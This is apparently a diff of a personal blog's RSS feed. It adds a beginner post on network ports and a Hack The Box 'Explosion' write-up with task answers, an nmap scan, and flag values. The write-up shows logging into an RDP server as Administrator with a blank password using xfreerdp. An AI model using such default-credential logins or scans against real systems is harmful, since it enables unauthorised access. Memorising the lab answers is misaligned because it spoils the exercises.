+      <pubDate>Fri, 21 Jun 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
+      <guid>http://localhost:1313/til-port/</guid>
+      <description>I feel like I&amp;rsquo;ve only scratched the surface when it comes to understanding Ports. Since I have an interview coming up, I want to review the basics of Ports, even if it&amp;rsquo;s very fundamental.
+What is a port? From Wikipedia
+a port is a number assigned to uniquely identify a connection endpoint and to direct data to a specific service.
+To simply put, a port is like an address for a specific program or service running on a computer.</description>
+      <content:encoded><![CDATA[<p>I feel like I&rsquo;ve only scratched the surface when it comes to understanding Ports. Since I have an interview coming up, I want to review the basics of Ports, even if it&rsquo;s very fundamental.</p>
+<hr>
+<h3 id="what-is-a-port">What is a port?</h3>
+<p>From Wikipedia</p>
+<blockquote>
+<p>a port is a number assigned to uniquely identify a connection endpoint and to direct data to a specific service.</p>
+</blockquote>
+<p>To simply put, a port is like an address for a specific program or service running on a computer.</p>
+<p>An IP address identifies a device on a network, while a port number identifies a specific process or service running on that device. When data is sent over a network, the IP address directs the data to the correct device, and the port number ensures it reaches the correct application or service on that device.</p>
+<p>Because a computer runs multiple processes simultaneously, not just a single one, it is import to distinguish between them. For example, on my computer right now, I have multiple Google Chrome tabs open, Discord running, and I&rsquo;m listening to music on Spotify.</p>
+<p>So, let&rsquo;s say we want to communicate with a program on an external server. Assuming we know its IP address, if we don&rsquo;t know its port number, we won&rsquo;t be able to locate the specific program we want to communicate with.</p>
+<h3 id="why-do-we-not-specify-the-port-numbers-in-the-browser">Why do we not specify the port numbers in the browser?</h3>
+<p>It is said that to communicate with a specific server, you need to know both the IP address and the port number. Through the domain address, you can only find out the IP address. So, how can we communicate normally without entering the port number?</p>
+<p>When you enter a domain address in the address bar and press enter, the browser is set to send the communicate to port 80 by default. That&rsquo;s why you don&rsquo;t need to enter the port number. If you don&rsquo;t want to communicate through port 80, you can set the port number separately in the address bar.</p>
+<h3 id="there-are-total-65535-ports">There are total 65,535 ports.</h3>
+<ul>
+<li>Port numbers 0 - 1023 are called <strong>System or Well-known</strong> ports.</li>
+<li>Port numbers 1024 - 49151 are called <strong>User</strong> or <strong>Registered</strong> ports.</li>
+<li>Port numbers 49152-65535 are called <strong>Dynamic</strong> or <strong>Private</strong> ports.</li>
+</ul>
+<hr>
+<p>Now it all makes sense. When we are doing a CTF, the first thing we always do in the enumeration phase is utilize the <strong>nmap</strong> command to perform port scanning. This helps us identify open ports and see which services are running on them. The target might be running several programs, and we need to find and confirm which programs/services are running and identify corresponding vulnerabilities.</p>
+]]></content:encoded>
+    </item>
     <item>
       <title>[HTB] Redeemer</title>
       <link>http://localhost:1313/htb-redeemer/</link>
@@ -248,6 +1291,145 @@ This box was the most challenging one to crack so far, but I feel incredibly acc
 <div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>10.129.136.187:6379&gt; get flag
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span><span style="color:#a6e3a1">&#34;03e1d2b376c37ab3f5319922053953eb&#34;</span>
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>10.129.136.187:6379&gt;</span></span></code></pre></div>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>[TIL] Explosion</title>
+      <link>http://localhost:1313/htb-explosion/</link>
+      <pubDate>Tue, 18 Jun 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
+      <guid>http://localhost:1313/htb-explosion/</guid>
+      <description>some thoughts:
+It was really fascinating when I first tried connecting to an RDP server. I just typed a few appropriate commands in the terminal CLI, and suddenly a small screen popped up over the terminal, displaying the Windows desktop screen. It might seem like no big deal to some, but for me, it was an amazing experience. It showed me how powerful these commands and knowing various server protocols can be.</description>
+      <content:encoded><![CDATA[<p>some thoughts:</p>
+<p>It was really fascinating when I first tried connecting to an RDP server. I just typed a few appropriate commands in the terminal CLI, and suddenly a small screen popped up over the terminal, displaying the Windows desktop screen. It might seem like no big deal to some, but for me, it was an amazing experience. It showed me how powerful these commands and knowing various server protocols can be.
+If felt like an explosion inside my brain! just like the name of the box.</p>
+<div style="text-align: center"><img src="./explode-explosion.gif"></div>
+<hr>
+<h5 id="task-1">TASK 1</h5>
+<p>What does 3-letter acronym RDP stand for?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>Remote Desktop Protocol</code></pre>
+<p>Remote Desktop Protocol (RDP) is a proprietary protocol developed by Microsoft, allowing users to connect to and control a remote computer over a network connection.</p>
+</br>
+<h5 id="task-2">TASK 2</h5>
+<p>What is a 3-letter acronym that refers to interaction with the host through a command line interface?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>CLI</code></pre>
+</br>
+<h5 id="task-3">TASK 3</h5>
+<p>What about graphical user interface interactions?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>GUI</code></pre>
+<br/>
+<h5 id="task-4">TASK 4</h5>
+<p>What is the name of an old remote access tool that came without encryption by default and listens on TCP port 23?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>Telnet</code></pre>
+<p>Telnet is one of the oldest protocols, established in 1969. By default, Telnet operates over TCP port 23. One of Telnet&rsquo;s main drawbacks is that it transmits data, including login credentials, in plaintext. This lack of encryption makes it vulnerable to eavesdropping and man-in-the-middle attacks, which is why it has largely been replaced by more secure protocols like SSH (Secure Shell).</p>
+<br/>
+<h5 id="task-5">TASK 5</h5>
+<p>What is the name of the service running on port 3389 TCP?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>ms-wbt-server</code></pre>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop/HTB/connections<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└─$ nmap -sV 10.129.1.13 -p <span style="color:#fab387">3389</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Starting Nmap 7.94SVN <span style="color:#89dceb;font-weight:bold">(</span> https://nmap.org <span style="color:#89dceb;font-weight:bold">)</span> at 2024-06-18 12:12 EDT
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Nmap scan report <span style="color:#cba6f7">for</span> 10.129.1.13
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Host is up <span style="color:#89dceb;font-weight:bold">(</span>0.034s latency<span style="color:#89dceb;font-weight:bold">)</span>.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>PORT STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>3389/tcp open ms-wbt-server Microsoft Terminal Services
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>Nmap <span style="color:#cba6f7">done</span>: <span style="color:#fab387">1</span> IP address <span style="color:#89dceb;font-weight:bold">(</span><span style="color:#fab387">1</span> host up<span style="color:#89dceb;font-weight:bold">)</span> scanned in 6.45 seconds
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>As you can see from the output, the ms-wbt-server service is running on port 3389/TCP.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>Also, I am using my Kali-Linux VM since I have used up all of my Pwnbox <span style="color:#89dceb">time</span> on Hack The Box.</span></span></code></pre></div>
+</br>
+<h5 id="task-6">TASK 6</h5>
+<p>What is the switch used to specify the target host&rsquo;s IP address when using xfreerdp?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>/v:</code></pre>
+<div style="text-align: center"><img src="./image7.png"></div>
+<br/>
+<h5 id="task-7">TASK 7</h5>
+<p>What username successfully returns a desktop projection to us with a blank password?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>Administrator</code></pre>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>/cert-ignore <span style="color:#89dceb;font-weight:bold">[</span>deprecated, use /cert:ignore<span style="color:#89dceb;font-weight:bold">]</span> Ignore
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>certificate</span></span></code></pre></div>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>/u:<span style="color:#89dceb;font-weight:bold">[[</span>&lt;domain&gt;<span style="color:#89b4fa">\]</span>&lt;user&gt;|&lt;user&gt;<span style="color:#89dceb;font-weight:bold">[</span>@&lt;domain&gt;<span style="color:#89dceb;font-weight:bold">]]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>Username</span></span></code></pre></div>
+<div style="text-align: center"><img src="./image8.png"></div>
+<div style="text-align: center"><img src="./image9.png"></div>
+<p>I was discovered useful switch options through the <strong>xfreerdp &ndash;help</strong> command, but I had no idea how to find a specific username that would allow me to connect to the RDP server with a blank password, as the RDP session was not accepting my own username. I had to look up the write-up provided by HTB, which revealed that the username was Administrator. Now that I know the username, I thought to myself, why didn&rsquo;t I think of trying &lsquo;<strong>Administrator</strong>&rsquo;?
+The final command <strong>xfreerdp /v:10.129.1.13 /cert-ignore /u:Administrator</strong> connected me to the RDP server with a blank password.</p>
+</br>
+<h5 id="submit-flag">SUBMIT FLAG</h5>
+<p>Submit root flag</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>951fa96d7830c451b536be5a6be008a0</code></pre>
+<div style="text-align: center"><img src="./image10.png"></div>
+<div style="text-align: center"><img src="./image11.png"></div>
 ]]></content:encoded>
     </item>
     <item>
